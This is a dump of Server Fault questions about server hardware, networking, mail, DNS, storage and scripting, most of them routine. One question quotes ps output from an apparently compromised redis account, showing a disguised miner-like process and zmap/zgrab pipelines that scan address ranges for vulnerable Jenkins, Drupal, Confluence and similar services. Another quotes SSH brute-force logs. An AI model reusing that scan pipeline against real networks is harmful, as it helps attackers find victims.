<p>Please suggest me how we can improve server speed? which server should I use? is single server is enough for this kind of daily active users? Our users are increasing day by day and we need to make it more reliable.</p>

<p>We are thinking to move to Amazon and should use load balancer but will it be a good idea?</p>

<p>Server Info:</p>

<hr>

<p>Commercial name
ADVANCE-LE - Intel Xeon W-2145 - 128GB DDR4 ECC 2666MHz - 2x SSD NVMe 960GB Datacenter Class Soft RAID</p>

<hr>

<p>System (OS):</p>

<hr>

<p>Cpanel 11.68 autoinstaller (CentOS 7 64bit)</p>

<hr>
","<linux><amazon-ec2>","2020-05-19 09:56:10"
"807512","Terminology for network interfaces on router?","<p>What is the correct terminology for the network interface that is connected towards the Internet on a router?</p>

<p>And what is the correct terminology for the network interface that is connected towards the LAN on a router?</p>
","<networking><router>","2016-10-06 15:16:12"
"1017776","My Server is sending malicious SSH requests","<p>I am facing weird issue on my server (Unix). There are couple vendors reported me that my server is sending malicious requests to their server by using SSH Protocol.</p>

<p>I have already checked the system logs under /var/log but didn't get anything there. Could you please guide me to stop these malicious activities being performed by my server.</p>

<p><strong>Below are the logs received from different-2 vendors, complaining that your server is sending these requests</strong> </p>

<pre><code>*May 10 05:20:03 shared05 sshd[18300]: Invalid user dmcserver from 217.138.XX.YY port 41630
May 10 05:20:03 shared05 sshd[18300]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=217.138.XX.YY
May 10 05:20:05 shared05 sshd[18300]: Failed password for invalid user dmcserver from 217.138.XX.YY port 41630 ssh2
May 10 05:20:05 shared05 sshd[18300]: Received disconnect from 217.138.XX.YY port 41630:11: Bye Bye [preauth]
May 10 05:20:05 shared05 sshd[18300]: Disconnected from invalid user dmcserver 217.138.XX.YY port 41630 [preauth]* 
</code></pre>

<p><strong>Note : 217.138.XX.YY is my server public IP Address.</strong></p>
","<ssh><unix><unix-shell><abuse><malicious>","2020-05-19 14:05:25"
"807540","Don't know Server Name","<p>I just installed SQL management studio to my computer. It opened up with window Connect to Server. What I shall write in Server Name part?</p>

<p>I have just started to study SQL. Where i can find Server Name?</p>
","<sql-server><sql>","2016-10-06 17:20:33"
"1017970","Best way to link two systems","<p>I am trying to link two Ubuntu 20.04 servers together </p>

<p>Server One is a cloud server with its own dedicated IP with DDoS protection and a hardware firewall. Server Two is a much higher performance server, but it is at my home with no dedicated IP.</p>

<p>I would like Server One to be able to listen on Server Two's IP to be able to open things like a web server. Right now I am able to accomplish this with SSH forwarding (command below) as a systemd daemon, but I would like to be able to scale this better with the ability to use more ports without having to add a new systemd file.</p>

<pre><code>ssh -N -R 3000:localhost:3000 user@serverone
</code></pre>
","<ssh><vpn><proxy><ip><tunneling>","2020-05-20 17:38:23"
"807752","Different servers for mail and hosting","<p>I've website on MS Azure and and a mail server from a different company. Two servers and their IP adresses are different. I am trying to host my website on MS Azure and receive/send e-mails using my mail server. Website is working fine but I cannot receive e-mails. This is how my domain configuration looks like:</p>

<pre><code>mail.domain.com     A   [mail server IP]    
domain.com  CNAME   address.westeurope.cloudapp.azure.com   
www.domain.com  CNAME   domain.com  
*.domain.com    MX  0,mail.domain.com   
domain.com  MX  10,mail.domain.com  
domain.com  NS  eu.dnsenable.com    
domain.com  NS  tr.dnsenable.com    
domain.com  NS  us.dnsenable.com
</code></pre>

<p>I guess I couldn't configure MX records correctly. I can't receive or send e-mails.</p>
","<email><email-server><mx-record>","2016-10-07 16:09:45"
"807760","VPN - multiple datacenters, multiple clients","<p>We're a small company and we have two cloud providers, mostly because of price, and no on-premises infrastructure (but we're considering it). And I'm a newbie into networking.</p>

<p>We need most of our servers not to be publicly visible but accessible from our computers. They're used mostly to experiment with training machine learning models so that you can run multiple experiments without blocking your laptop.</p>

<p>So far, these servers at one provider are behind firewall and accessible through OpenVPN. However, the servers at the second provider are visible on the internet which I'd like to avoid.</p>

<p>I need to be able to connect to both clouds and the cloud servers should also see each other.</p>

<p>I can imagine how to configure a site-to-site OpenVPN connection between the datacenters and two connections from each of the clients to both datacenters. </p>

<p>The problem I can see is that if we'd add a datacenter, there would be many more tunnels needed. How can I avoid it? Thanks in advance.</p>
","<networking><vpn><openvpn>","2016-10-07 17:06:00"
"807858","LVM vs ZFS (vs BTRFS) for home file server","<p>I am rebuilding my small fileserver (Athlon 5350 + 4GB ddr3 running CentOS 7) replacing several second-hand hard driver with WD Red.
The server is mainly used for personal files (documents, pictures), media files (music and videos) and othe rsoftware (VM images, iso, installers etc..)</p>

<p>I want to mirror personal files and to dynamically expand the array adding new drives or resising partitions e.g.:
given 2 TB HDD I want 2 mirrored 500GB partitions and 2 1,5TB stripped/JBOD partitions for other files with the chance to add 2/4TB hdds in future.</p>

<p>To achieve this which is the better solution in terms performance (ZFS should be memory hungry), reliability and which is easier to use? I read also about BTRFS does it have some advantages over ZFS? </p>

<p>Another question: when I lose an hdd in a LVM group all data ase lost, is the same with ZFS or is it possible to split entire files on different partition and recover at least a part of data?</p>

<p>Thank you! </p>
","<filesystems><lvm><zfs><network-attached-storage><mirror>","2016-10-08 10:42:21"
"1018195","Cpanel NodeJS app displaying source code","<p>I have set up nodeJS app on cpanel using cpanel nodeJS selector. Apps root directory is <code>/home/userName/public_html/server</code>. The app is working fine.</p>

<p>Problem is if I send get request to <code>example.com/server/app.js</code> it is displaying the source code of app.js in the browser. </p>

<p>How do I prevent it? </p>
","<apache-2.2><.htaccess><node.js><cpanel>","2020-05-22 07:36:40"
"807978","How much hard drive space to install MYSQL, PHP7 & nginx?","<p>I'm provisioning a server, I want a rough estimate on how much HD space I would need.</p>

<p>I want to install mysql, PHP7 and nginx, plus a handful of small websites. </p>

<p>How much server space would I need to be able to do this?</p>
","<linux><ubuntu><nginx><mysql><php7>","2016-10-09 12:28:23"
"1018256","Download a file from remote Linux to local Windows (user access at Linux machine with ssh; I cannot install software on Windows and no PuTTY)","<p>I have user access at Linux machine. I am able to connect to Linux machine with ssh from Windows machine and execute Linux commands.</p>

<p>I cannot install any software on Windows machine. I do not have PuTTY installed on on Windows machine.</p>

<p><strong>Question:</strong> How to download a file from remote Linux machine to local Windows machine?</p>
","<linux><windows><remote-access><file-transfer>","2020-05-22 15:34:40"
"1018267","Suspicious ksoftirqd_1 process using high cpu","<p>I run this webserver that serves data to a couple of apps. In the last couple of days I have noticed that some requests take some more time than usual, so I did a top to find out what's running and this is what I get:</p>

<pre><code>15335 redis     20   0  300564 265304    864 S 45.4 12.9  92:10.87 ksoftirqd_1                                                                                                                 
22747 wsgi-da+  20   0 1356280 152532   7512 S 43.1  7.4 218:11.78 apache2                                                                                                                     
32228 redis     20   0    9152   7512      4 S  1.0  0.4   0:01.65 zmap                                                                                                                        
32266 redis     20   0    9088   7368      4 S  1.0  0.4   0:01.55 zmap                                                                                                                        
32267 redis     20   0  222312  23528    440 S  1.0  1.1   0:06.66 zgrab                                                                                                                       
8 root      20   0       0      0      0 R  0.7  0.0  25:00.24 rcuos/0                                                                                                                     
31981 www-data  20   0  424756  13448   2688 S  0.7  0.7   0:00.21 apache2  
</code></pre>

<p>There is this ksoftirqd_1 taking almost half of the cpu usage, and it is run by the redis user. Notice that there are also a couple of other processes run by the redis user.</p>

<p>Now, searching on the internet I found out that there are actually ksoftirqd processes that seem to help managing IRQs (or something like that). The thing is, they should show up as ksoftirqd/* instead of ksoftirqd_* (notice the underscore instead of the slash). In fact, I do have ksoftirqd/* processes running by the root user:</p>

<pre><code>3 root      20   0       0      0      0 S  0.0  0.0   1:10.40 ksoftirqd/0                                                                                                                 
</code></pre>

<p>So this makes me wonder if this process (and the others run by redis user) are legitimate. I recall that I used to have a redis-server running on this machine for I project I worked on a couple of years ago. And when I was checking this issue, the server was still running (...). But after stopping it, all these redis processes are still using system resources.</p>

<p>I also did a ps aux | grep redis and this is what i got:</p>

<pre><code>redis      324  0.5  0.3   9088  6712 ?        Sl   17:03   0:00 zmap 443 x.x.x.x/19
redis      325  1.4  0.9 350212 18696 ?        Sl   17:03   0:02 zgrab --senders 100 --port 443 --tls --http=/ --http-max-redirects 2 --output-file=-
redis      326  0.0  0.0   9020   912 ?        S    17:03   0:00 grep -Ei x_jenkins|mongo-express|drupal|confluence|vbulletin
redis      327  0.1  0.0   4028  1736 ?        S    17:03   0:00 jq -r .ip
redis      361  0.6  0.3   9024  6176 ?        Sl   17:03   0:00 zmap 443 y.y.y.y/19
redis      362  2.3  0.9 284676 19068 ?        Sl   17:03   0:02 zgrab --senders 100 --port 443 --tls --http=/ --http-max-redirects 2 --output-file=-
redis      363  0.0  0.0   9212  1052 ?        S    17:03   0:00 grep -Ei x_jenkins|mongo-express|drupal|confluence|vbulletin
redis      364  0.2  0.0   4028  1736 ?        S    17:03   0:00 jq -r .ip
redis      377  0.8  0.3   9088  6676 ?        Sl   17:03   0:00 zmap 443 z.z.z.z/19
redis      378  5.6  1.2 289960 25068 ?        Sl   17:03   0:05 zgrab --senders 100 --port 443 --tls --http=/ --http-max-redirects 2 --output-file=-
redis      379  0.0  0.0   9472  1188 ?        S    17:03   0:00 grep -Ei x_jenkins|mongo-express|drupal|confluence|vbulletin
redis      380  0.2  0.0   4028  1736 ?        S    17:03   0:00 jq -r .ip
redis    15332  0.0  0.1   5484  3580 ?        S    14:06   0:00 bb50c48a591f3bfe9a993dcb0d790d0bi
redis    15335 54.3 12.9 300564 265304 ?       Sl   14:06  97:20 
redis    29700  0.0  0.0   4444   644 ?        S    16:30   0:00 sh /var/lib/redis/a
redis    29702  0.0  0.0   4444   712 ?        S    16:30   0:00 sh
redis    30309  0.0  0.0   4444   648 ?        S    16:30   0:00 sh /var/lib/redis/a
redis    30311  0.0  0.0   4444   716 ?        S    16:30   0:00 sh
redis    30886  0.0  0.0   4444   644 ?        S    16:30   0:00 sh /var/lib/redis/a
redis    30888  0.0  0.0   4444   712 ?        S    16:30   0:00 sh
</code></pre>
","<linux><security><performance><process><redis>","2020-05-22 17:15:17"
"1018289","Postfix routinely references both smtp and smtpd in configuration files. What is the difference?","<p><strong>Environment:</strong> Postfix 3.3</p>

<p>In my <code>main.cf</code> file I see references to both <code>smtp</code> and <code>smtpd</code>.</p>

<p>For example:</p>

<p><code>smtpd</code> security is set here.</p>

<pre><code>smtpd_tls_security_level = may
</code></pre>

<p>And just a few lines below <code>smtp</code> security is set in an otherwise identical parameter.</p>

<pre><code>smtp_tls_security_level = may
</code></pre>

<p>Other examples are these <code>smtpd</code> parameters:</p>

<pre><code>smtpd_tls_cert_file
smtpd_tls_key_file
</code></pre>

<p>Although these aren't exactly the same just a few lines below <code>smtp</code> is used.</p>

<pre><code>smtp_tls_CApath
smtp_tls_CAfile
</code></pre>

<p><strong>Question:</strong>  As far as Postfix is concerned what is the difference between <code>smtp</code> and <code>smtpd</code>?</p>
","<postfix><email-server>","2020-05-22 20:45:16"
"808001","Ressources for HAProxy on heavy load","<p>What are the main ressources HAProxy needs handling millions of requests per hour? What hardware is recommended (CPU, Cored, Ram...)?</p>
","<hardware><haproxy><max-requests>","2016-10-09 15:21:34"
"1018323","Bash script to login to server using ssh and run commands","<p>Below is the script which i use to create user on server but everytime i need to copy the script on server.I want to create a script which ill run on my machine.ill enter dest IP adddress and hostname in command and script will go to destination server and run commands mentioned in script and user will be created on dest server</p>

<pre><code>read -p 'Please Enter The Username To Add: ' name
echo ""$name"" &gt; /tmp/userlist.txt
clear
echo -e ""Hallo $name\nYour Name Is Added To The List.""
userfile=/tmp/userlist.txt
username=$(cat /tmp/userlist.txt | tr 'A-Z' 'a-z')
for user in $username
do
sudo useradd $user
sudo passwd $user
done
echo ""==================================""

echo ""User $name Have Been Created.""

echo ""==================================""
tail /etc/passwd | cut -d: -f1
</code></pre>
","<bash><scripting>","2020-05-23 04:43:59"
"1018360","Is there some way to get PHP to log a warning/notice/error whenever a function is being called with too many parameters?","<p>I used to have this:</p>

<pre><code>function whatever($foo, $bar, $foobar, $barfoo)
</code></pre>

<p>Later, it turned into:</p>

<pre><code>function whatever($foo, $bar, $foobar)
</code></pre>

<p>Still, there were some instances of code doing:</p>

<pre><code>whatever(1, 2, 3, 4);
</code></pre>

<p>That is, they were sending a fourth argument in spite of the <code>$barfoo</code> parameter having been removed.</p>

<p>Sadly, this was never logged as an error of any kind.</p>

<p>Why not? Can I enable this? Is it a bad idea for some reason?</p>
","<php>","2020-05-23 12:13:38"
"808128","Bash, script that check soft","<p>i have a script on bash:</p>

<pre><code>s=0
 if [ -f /usr/bin/curl ] &amp;&amp; [ -x /usr/bin/curl ] ; then
    echo  ""Utility ...... curl [ ok ]""
    else
    echo  ""Utility ...... curl [fail]""
    s=1
 fi
 if [ -f ""/bin/grep"" ] &amp;&amp; [ -x ""/bin/grep"" ] ; then
    echo  ""Utility ...... grep [ ok ]""
    else
    echo  ""Utility ...... grep [fail]""
    s=1
 fi
 if [ -f ""/usr/bin/expr"" ] &amp;&amp; [ -x ""/usr/bin/expr"" ] ; then
    echo  ""Utility ...... expr [ ok ]""
    else
    echo  ""Utility ...... expr [fail]""
    s=1
 fi
 if [ -f ""/bin/sed"" ] &amp;&amp; [ -x ""/bin/sed"" ] ; then
    echo  ""Utility ...... sed  [ ok ]""
    else
    echo  ""Utility ...... sed  [fail]""
    s=1
 fi
 if [ $s -eq 0 ]; then
    echo  ""All seems to be good. Let's play.""
 else
    echo  ""Please install requirement util! ""
 fi
</code></pre>

<p>I want write without /usr/bin or /bin. I want write one variable:</p>

<pre><code>$ENV/curl
</code></pre>

<p>And others ... <br>
How to do this.</p>
","<linux><bash><shell><shell-scripting><path>","2016-10-10 12:50:36"
"1018580","Server running an OS","<p>How do I know if my server has a OS. How do I know if it is only a media device to store files on? I want to know if it has an OS or if I need to install an OS onto it to help with my work.</p>
","<operating-system>","2020-05-25 09:26:49"
"1018583","Multiple Linux servers login via keyring","<p>I have a number of Linux VM on the cloud as well as on in-house VM servers. They are a mix of RH, OEL, CentOS, Ubuntu.</p>

<p>As part of security hardening, I have disabled password authentication and all users login using public/private keys. To use this method, when I add a user to a VM, I copy his authorized_keys file. All of my users use Windows 10 and Putty clients.</p>

<p>So far so good.</p>

<p>I was wondering, is there a method whereby I could place all public key files in a central place such as a keyring? That way I wouldn't have to copy them to each server. Then the servers could read the public keys from there to authenticate users. How about LDAP? Can I put the public keys into LDAP entries?</p>
","<linux><security><ldap><authentication>","2020-05-25 09:55:45"
"808328","Can rsync detrimentally affect the performance of the source server?","<p>I'm planning to run an <code>rsync</code> command on Server A, to copy 40GB of files to Server B.</p>

<p>Server A is a production server, Server B is not.</p>

<p>If I run rsync on Server A, can the command detrimentally affect the performance of that server? It needs to continue to work as an FTP server during the transfer.</p>
","<rsync>","2016-10-11 11:23:06"
"808336","Multiple DHCP on the network","<p>I work in a company where two companies are under one network. They use same subnet. (We have 50 clients (pc) - 4 servers - total for both companies) </p>

<p>Both companies have own server for domain controller, each company have own employees. </p>

<p>I was wondering is it good solution to set main router (default gateway) to serve as only DHCP, and to remove DHCP from domain controllers ? </p>

<p>Only servers have static IP address. It is hard to manage multiple DHCP servers. Especially in this case where employees use WIFI connection as well</p>

<p>Router model - CISCO RV325  Gigabit Dual WAN VPN Router</p>
","<windows-server-2012-r2><dhcp>","2016-10-11 12:04:10"
"1018609","we are getting error during app deployment","<p>Getting the following error while trying to deploy using the free tier :</p>

<p>ERROR: (gcloud.app.deploy) Error Response: [13] Flex operation projects/daidish/regions/asia-south1/operations/5cb7dbc1-ce4d-4dd6-b136-141d1b82faff error [INTERNAL]: An internal error occurred while processing task /appengine-flex-v1/insert_flex_deployment/flex_create_resources>2020-05-25T10:04:05.204Z40459.jo.13: Deployment Manager operation daidish/operation-1590401046216-5a6761968fe71-d73da15d-e65f3da7 errors: [code: ""RESOURCE_ERROR""
location: ""/deployments/aef-default-20200525t153043/resources/aef-default-20200525t153043""
message: ""{\""ResourceType\"":\""compute.beta.regionAutoscaler\"",\""ResourceErrorCode\"":\""403\"",\""ResourceErrorMessage\"":{\""code\"":403,\""errors\"":[{\""domain\"":\""usageLimits\"",\""message\"":\""Exceeded limit \'QUOTA_FOR_INSTANCES\' on resource \'aef-default-20200525t153043\'. Limit: 8.0\"",\""reason\"":\""limitExceeded\""}],\""message\"":\""Exceeded limit \'QUOTA_FOR_INSTANCES\' on resource \'aef-default-20200525t153043\'. Limit: 8.0\"",\""statusMessage\"":\""Forbidden\"",\""requestPath\"":\""<a href=""https://compute.googleapis.com/compute/beta/projects/daidish/regions/asia-south1/autoscalers"" rel=""nofollow noreferrer"">https://compute.googleapis.com/compute/beta/projects/daidish/regions/asia-south1/autoscalers</a>\"",\""httpMethod\"":\""POST\""}}""</p>
","<google-app-engine>","2020-05-25 13:10:16"
"808396","Security Test and Monitoring for AWS EC2 running SFTP using OpenSSH?","<p>I have an EC2 Instance that is running SFTP via OpenSSH on Amazon Linux (CentOS). I'd like to run some tests to check for vulnerabilities that I'm not aware of, and I'd like to run monitoring software that watches for suspicious behavior. What is available / suggested? Free is great, but paying for a service is fine too.</p>

<p><strong>Some Notes</strong></p>

<ul>
<li>The only user able to connect over SSH is the ec2-user and that user is required to use a pem key</li>
<li>Customers connecting to the system must have their IP whitelisted in the EC2's security group</li>
</ul>

<p><strong>sshd_config Settings</strong></p>

<pre><code># SFTP Users
Match Group sftpusers
    PasswordAuthentication yes
    ChrootDirectory /sftp/%u
    ForceCommand internal-sftp -l DEBUG3 # -l INFO enables logging to /var/log/secure
    AllowTcpForwarding no
    PermitTunnel no
    X11Forwarding no

# SFTP Admins
Match Group sftpadmins
    PasswordAuthentication yes
    ChrootDirectory /sftp/
    ForceCommand internal-sftp -l DEBUG3 # -l INFO enables logging to /var/log/secure
    AllowTcpForwarding no
    PermitTunnel no
    X11Forwarding no
</code></pre>
","<ssh><security><monitoring><sftp><network-monitoring>","2016-10-11 15:07:10"
"808421","How can Exchange be configured to escalate an email through people until it is read?","<p>How can I configure Microsoft Exchange to take an email to a specific common email address and put it in a particular person's inbox and if that person hasn't read the email in 10 minutes, put it in another person's inbox, and then 10 minutes later another's inbox, and to keep doing this until someone has read it.  Then, when someone has read it, mark everyone's email as ""read"" or somehow mark it as being taken care of at that time?</p>
","<exchange>","2016-10-11 16:58:52"
"808501","Slow mail server in looking up host name","<p>Hello my mail server is very slow to accept SMTP connections.</p>

<p>I found a tutorial to make a stop in my Exim4 and run the command below to see where it takes.</p>

<p><code>exim -bd -d -oX 587</code></p>

<blockquote>
  <p>Follow the exit, and where is more downtime. Can you help me figure out why it is so slow.</p>
</blockquote>

<pre><code>29136 Connection request from 187.23.45.188 port 61995
29136 search_tidyup called
29136 1 SMTP accept process running
29136 Listening...
29141 sender_fullhost = [187.23.45.188]
29141 sender_rcvhost = [187.23.45.188]
29141 Process 29141 is handling incoming connection from [187.23.45.188]
29141 host in host_lookup? yes (matched ""*"")
29141 looking up host name for 187.23.45.188 -----&gt; VERY SLOW HERE
</code></pre>
","<email-server><exim><slow-connection>","2016-10-12 00:50:46"
"1018892","Partition at 51% with df while folders are empty?","<p>I need some help on this one.</p>

<p>I use a test server which is Debian 10 with Docker's containers (all these inside a XCP-NG server).</p>

<pre><code># df -h
Sys. de fichiers      Taille Utilisé Dispo Uti% Monté sur
/dev/xvda11              32G     15G   15G  51% /data
//localnetwork/Download   8,2T    4,8T  3,5T  59% /data/downloaded
</code></pre>

<p>My issue is about these 15G used in /data. Sub-folders into /data are /data/torrent and 2 others directories I never used.</p>

<p>du -xca into these folders show them empty</p>

<p>I messed up at the begining because :</p>

<ul>
<li>/data/downloaded was, at first, part of my /data partition.</li>
<li>After that I tried to mount my NAS with NFS but uid were to
complicated to do as users were already in use both side</li>
<li>Since then, I use cifs</li>
</ul>

<p>While I was playing with nfs, 2 files finished and probably got in pending state as it was impossible to move to /data/downloaded because of permissions.</p>

<p>Now the setup is working fine, except I have these 15 GB in /data I don't see no matter what I try :
du -xca &amp; ls -alh return empty folders</p>

<p>After some googling, I tried </p>

<pre><code># lsof +L1
</code></pre>

<p>&amp;</p>

<pre><code># lsof +L | grep torrent
lsof: WARNING: can't stat() fuse.sshfs file system /tmp/.x2go-az/spool/C-az-50-1590501658_stDMATE_dp32
      Output information may be incomplete.
bash       33859                             media  cwd       DIR             202,11      4096     2    1177345 /data/torrents
</code></pre>

<p>Hence I decided to do it easy mode, just reboot (well it's not a prod server after all)
The line disappeared but df still showing 15 Gb.
I checked /data/lost+found folder but it's empty too.</p>

<p>I'm out of idea so if you have any, your are more than welcome :)</p>
","<docker><df><debian-buster>","2020-05-27 10:06:10"
"808699","Force Https CentOS Web Panel","<p>I am using <code>CentOS Web Panel</code> and trying to redirect to <code>https</code> also when someone hits the <code>http</code> link. I am only able to open both <code>https</code> when i type 
<code>https://domain.com</code>.</p>

<p>Using the below rules solves my problem</p>

<pre><code>RewriteEngine On
RewriteCond %{SERVER_PORT} !=443
RewriteRule ^ https://www.yourdomain.com%{REQUEST_URI} [NS,R,L]
</code></pre>

<p>But i need to add this to all the sites in my server.</p>

<p>How can i automatically redirect all the sites in my server?</p>

<p>Does any method other than <code>.htaccess redirection</code> exists to redirect to https?</p>

<p>Hope i have clearly stated the problem.</p>
","<.htaccess><redirect><centos6><vps>","2016-09-26 03:25:01"
"1019090","Is it possible to block bind to answer to queries type ""any""?","<p>I wanted to know if it was possible, like cloudflare is doing, to make bind deny any answer to queries from the type ""any"" like in <code>dig google.com any</code></p>
","<bind>","2020-05-28 19:04:46"
"1019236","My PC makes A DNS requests for npi64eceb.fritz.box (NXDOMAIN) quite frequently - what is causing this?","<p>I have a Pi_hole installed on my network as my DNS server. While perusing the logs, I noticed that a windows 10 PC on my network makes frequent A DNS requests for npi64eceb.fritz.box - I have no idea what this site is or why my machine might need to resolve it. </p>

<p>My Pi-Hole responds with NXDOMAIN, and third party DNS lookup sites record no domain either. </p>

<p>This is happening every 20-30s or so - how can I find out what is going on?</p>
","<domain-name-system><windows-10>","2020-05-29 19:33:11"
"1019252","which is the popular and linux distros for begginers","<p>I want to install Linux but i know that it is not compatible with a lot of software and it is hard to use
but it is good at security issues.
so i would like your help for choosing the best distro as beginner software developer that will prevent my computer from viruses and help me in learning of software development</p>
","<linux><ubuntu><linux-kernel>","2020-05-29 21:35:26"
"809155","Why are there so many applications designed to only run on the C drive?","<p>It seems like with Windows 7 onward, many common applications will only install to a directory of their choice:</p>

<ul>
<li>Office 2013 </li>
<li>Visual Studio</li>
<li>Chrome </li>
<li>SQL Server</li>
</ul>

<p>This ranges from being slightly annoying to very inconvenient if you have a small OS drive, large secondary drive. </p>

<p>I understand I could just junction link a lot of these files to another drive, but that can be impractical for some applications like Visual Studio, who have regular updates that are not compatible with those links. </p>

<p>My questions is, why do you think this is happening?</p>
","<windows><installation><junction>","2016-10-14 21:39:16"
"809190","Nginx ssl port 433 not open/listening (refused to connect)","<p>I'm running nginx 1.6.2 on Linux and using CloudFlare origin certificates for HTTPS, I have installed the certificate and key in (for example) <code>/path/to/certs</code> and run <code>chown 600 root</code> on the directory and the certificate files (<code>origin.pem</code> and <code>private.pem</code>), <strong>when I try to open <code>https://192.168.0.96</code> (on another computer) it says refused to connect</strong>. NMap shows port 80 is open, but not 443. Here is my <code>/etc/nginx/sites-available/http</code> file (www root is <code>/var/www/http</code>), modified according to the <a href=""https://support.cloudflare.com/hc/en-us/articles/217471977"" rel=""nofollow noreferrer"">CloudFlare nginx config tutorial</a></p>

<pre><code>server {
        listen 80 default_server;
        listen [::]:80 default_server;


        listen 443 ssl default_server;
        ssl on;
        ssl_certificate         /path/to/certs/origin.pem;
        ssl_certificate_key     /path/to/certs/private.pem;

        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        access_log      /var/log/nginx.vhost.access.log
        error_log       /var/log/nginx.vhost.access.log
        server_name example.com

        location / {
                try_files $uri $uri/ =404;
        }
}
</code></pre>

<p>I'm happy to run additional diagnostics if that would help find the problem.</p>
","<nginx><ssl><ssl-certificate><self-signed-certificate><port-443>","2016-10-15 07:25:12"
"1019308","Linux head and tail equivalent command in MySQL","<p>In Linux, it's easy to get first few data from top or bottom with <code>head</code> and <code>tail</code> command.</p>

<pre><code>wolf@linux:~$ cat db.txt 
| information_schema |
| database_name      |
| mysql              |
| opencart           |
| wordpress          |
| performance_schema |
| sys                |
wolf@linux:~$ 
</code></pre>

<p>top 2</p>

<pre><code>wolf@linux:~$ cat db.txt | head -2
| information_schema |
| database_name      |
wolf@linux:~$ 
</code></pre>

<p>Last 2</p>

<pre><code>wolf@linux:~$ cat db.txt | tail -2
| performance_schema |
| sys                |
wolf@linux:~$ 
</code></pre>

<p>Is there any similar command in MySQL?</p>

<p>All databases</p>

<pre><code>mysql&gt; SHOW DATABASES;
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| database_name      |
| mysql              |
| opencart           |
| wordpress          |
| performance_schema |
| sys                |
+--------------------+

7 rows in set (0.00 sec)
mysql&gt;
</code></pre>

<p>Desired Output: Top 2 database</p>

<pre><code>mysql&gt; &lt;mysql command here&gt;
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| database_name      |
</code></pre>

<p>Desired Output: Last 2 database</p>

<pre><code>mysql&gt; &lt;mysql command here&gt;
| performance_schema |
| sys                |
+--------------------+
</code></pre>
","<mysql>","2020-05-30 09:06:25"
"1019328","Can a server behind a load balancer get responses to its requests?","<p>Assume there are two servers A, B that are behind a load balancer, for example, they could be two docker containers. If server A makes an HTTP GET request to some-site.com, it is possible that the response gets delivered to server B by the load balancer. According to my understanding, externally there is just one IP address visible, and the load balancer is a Network Layer device which will just randomly send IP packets it gets to one of the servers it is balancing. I think I am missing something basic here like perhaps the load balancer works like a NAT router?</p>
","<networking><load-balancing><nat><internet>","2020-05-30 14:21:01"
"1019464","In 2020 - are there any viable Linux block-level replication alternatives for DRBD?","<p>I'm researching how can we implement near-realtime replication from primary datacenter to a disaster recovery site. Data that would get replicated would be:</p>

<ul>
<li>Images of KVM VMs</li>
<li>MySQL and PostgreSQL databases</li>
</ul>

<p>For the sake of simplicity let's assume it's less than 10TB of data in total with average write speed of under 100MB/s, peaking at 1500MB/s and link between the primary and backup datacenter would have throughput of 10gbit/s.</p>

<p>Asynchronous replication is acceptable and desired - in case of bursty writes or short outage of the connectivity between both datacenters - we don't want to slow down local write speed and are willing to sacrifice the most recent portion of data that might be lost in case of catastrophic failure affecting the primary datacenter.</p>

<p>My understanding is that we can choose between:</p>

<ul>
<li>proprietary SAN hardware that can come with replication feature and can provide iSCSI LUNs</li>
<li>DRBD that will likely need to be combined with DRBD proxy [ to make sure that temporary drop of available bandwidth or latency spike between both datacenters does not affect write performance at the source ]</li>
<li>Software-based solutions like <a href=""http://schoebel.github.io/mars/"" rel=""noreferrer"">http://schoebel.github.io/mars/</a>, which - sadly - will take quite a while to be merged into mainline kernel in the best case scenario</li>
<li>For DBs - database-level replication is an option as well but - we'd like to carry occasional DR tests for which we want to switch all workloads between the datacenters. Failing back from the DR site to the main site would be quite cumbersome.</li>
</ul>

<p>Are there any other solutions worth considering?</p>

<p>Thank you!</p>
","<linux><kvm-virtualization><disaster-recovery><drbd>","2020-05-31 19:16:47"
"809432","DHCP duplicate scope","<p>I have the same DHCP scope exist in two domains. Both contain leases of client PCs. I want to have only one of the Domains will be going.</p>

<p>In some cases the same IP address exists in both scopes. in others the IP address may exist in one scope or the other.</p>

<p>What would be the impact of Deactivating and/or Deleting of one of the scopes?</p>

<p>Thanks</p>
","<domain><dhcp>","2016-10-17 00:53:44"
"1019676","RAID 1 HDD vs SSD","<p>I would like to implement backup solution in my workstation - I do not take separate NAS server into consideration, one machine is the limit for me.</p>

<p>My desktop is up almost 12h per day, and it can serve as NAS server in my home.
So it would be NAS server and backup storage at the same time.</p>

<p>The problem I have now is to decide what storage configuration to use.
In my machine I have one 1 TB M.2 NVMe disk, and it's more that enough - at least for now.
But one disk doesn't provide any safety, so I want to create RAID 1 with w additional disks.
But the question is should I create raid with 2xHDD 2TB drives or pay a little bit more and use 2xSSD 2TB?
As I said before it will server as NAS for other devices I use at home (mainly backup).
Which solution is better in terms of data durability/safety?</p>
","<raid><network-attached-storage>","2020-06-02 11:41:05"
"1019707","SSL Certificate error for self signed certificate although certificate is installed","<p>we are using a server that is used by like 5 coworkers and is accessed by its web interface.
It is a internal only website and doesn't have a valid SSL certificate as it is self signed.</p>

<p>The certificate is deployed via GPO to the trusted root CA folder, so it is installed on the computer.
Still the user would get a certificate error when trying to access the website (using Chrome or IE).</p>

<p>Does it not work anymore to just deploy self signed certificates?
The purpose is just to avoid the coworkers being required to ignore the certificate warning everytime.</p>

<p>Thanks for your suggestions.</p>

<p><a href=""https://i.sstatic.net/dEcP1.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/dEcP1.png"" alt=""certificate error""></a></p>
","<ssl><certificate><chrome>","2020-06-02 14:56:39"
"1019709","Why AWS NLB doesn't need pre-warming?","<p>I learned that AWS NLB doesn't require pre-warming whereas CLB and ELB need. </p>

<blockquote>
  <p>NLB is designed to handle tens of millions of requests per second while maintaining high throughput at ultra-low latency, with no effort on the customer's part. As a result, no pre-warm is needed.</p>
</blockquote>

<p>from <a href=""https://books.google.co.jp/books?id=bP1wDwAAQBAJ&amp;pg=PA232&amp;lpg=PA232#v=onepage&amp;q&amp;f=false"" rel=""nofollow noreferrer"">Effective DevOps with AWS</a></p>

<p>According to some relative information I found, NLB doesn't need pre-warming because it is designed to handle large amount of requests. On the other hand, ELB needs to scale up when the requests dramatically increased during a short period.   </p>

<p>It makes sense but appears to be too general. I am curious what kind of difference in design brought this divergence. Is it because NLB focuses on L4 load balancing?</p>
","<amazon-web-services><load-balancing>","2020-06-02 15:11:38"
